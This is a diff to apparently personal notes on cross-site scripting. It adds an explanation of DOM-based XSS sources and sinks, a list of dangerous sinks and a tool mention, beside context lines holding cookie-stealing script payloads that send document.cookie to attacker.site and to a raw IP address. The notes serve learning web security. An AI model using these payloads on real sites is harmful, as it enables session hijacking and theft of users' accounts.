@@ -97,7 +97,28 @@ i.src = “http://attacker.site/get.php?cookie=”+escape(document.cookie);
 # Or in one line:
 <script>var i = new Image(); i.src = “http://10.86.74.7/moville.php?cookie=”+escape(document.cookie); </script>
 ```
- 
+
+
+## DOM-based cross-site scripting attack
+
+To deliver a DOM-based XSS attack, you need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript.
+The most common source for DOM XSS is the URL, which is typically accessed with the `window.location` object.
+
+What is a sink? A sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it. For example, the `eval()` function is a sink because it processes the argument that is passed to it as JavaScript. An example of an HTML sink is `document.body.innerHTML` because it potentially allows an attacker to inject malicious HTML and execute arbitrary JavaScript.
+
+Summing up: you should avoid allowing data from any untrusted source to be dynamically written to the HTML document.
+
+Tools: BurpSuite Web Vulnerability scanner.
+
+Which sinks can lead to DOM-XSS vulnerabilities:
+
+- document.write()
+- document.writeln() 
+- document.domain 
+- element.innerHTML 
+- element.outerHTML 
+- element.insertAdjacentHTML 
+- element.onevent
 
 ## Tools and payloads
 
